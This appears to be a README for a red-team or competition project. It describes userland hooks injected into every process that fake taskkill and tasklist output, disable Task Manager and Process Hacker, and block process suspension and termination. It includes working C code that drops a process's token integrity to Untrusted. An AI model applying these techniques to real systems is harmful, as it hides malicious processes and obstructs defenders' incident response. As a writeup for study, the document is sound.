# Userland Hooking

Userland Hooking was done by injecting the compiled version of [`hook.c`](hook.c)
into each user process.

## taskkill

Taskkill was intercepted and made to return "SUCCESS" and exit with exit code
zero.

You'd notice this if you ran `tasklist /?`, it should return "SUCCESS", which is
not valid behavior.

## tasklist

Tasklist was intercepted and made to return a string constant. The returned results
were not real processes.

The string value in question:

```text
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          0 K
System                           4 Services                   0          0 K
smss.exe                         0 Services                   0          0 K
csrss.exe                        0 Console                    0          0 K
duck.exe                        -1 Services                   1          0 K
wininit.exe                      0 Services                   0          0 K
never_gonna                     10 Console                    1          0 K
give_you_up                     11 Console                    1          0 K
never_gonna                     12 Console                    1          0 K
let_you_down                    13 Console                    1          0 K
never_gonna                     14 Console                    1          0 K
run_around                      15 Console                    1          0 K
and_hurt_you                    16 Console                    1          0 K
never_gonna                     17 Console                    1          0 K
say_goodbye                     18 Console                    1          0 K
never_gonna                     19 Console                    1          0 K
see_you_cry                     20 Console                    1          0 K
```

## taskmgr

Task Manager was intercepted and a thread was started on runtime that removed
all permissions and set the Token Integrity level to "Untrusted" making it unable
to display or refresh process information.

```C
DWORD DoUntrust(void) {
    Sleep(500);
    HANDLE t;
    // Get Token for the current process.
    // 0x200A8 - TOKEN_READ | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_QUERY
    if (!OpenProcessToken(GetCurrentProcess(), 0x200A8, &t)) {
        return 0;
    }
    SID a;
    DWORD c = 32;
    // Create an untrusted SID
    // 0x41 - WinUntrustedLabelSid
    if (!CreateWellKnownSid(0x41, NULL, &a, &c)) {
        CloseHandle(t);
        return 0;
    }
    SID_AND_ATTRIBUTES b;
    b.Sid = &a;
    b.Attributes = 0x20; // SE_GROUP_INTEGRITY
    // Set the untrusted SID as the Token Group SID
    // 0x19 - TokenIntegrityLevel
    SetTokenInformation(t, 0x19, &b, c + 4);
    CloseHandle(t);
}
```

## Process Hacker

Similar to `taskmgr` this process had it permissions removed and it's Token
Integrity level to "Untrusted" making it unable to display or refresh process
information.

The one different factor is an additional check against the `FileInfo\FileDescription`
which would equal the same string, regardless of the name of the process. This allows
for matching the process even if it's renamed.

## Other

Other non-critical processes had the following API functions intercepted.

- NtSuspendThread: Prevents suspending any Thread.
- NtSuspendProcess: Prevents suspending any process.
- NtTerminateProcess: Prevents terminating any Process.
  - This was bypassed if the PID equals the current PID as `ExitProcess` uses
    this under the hood.
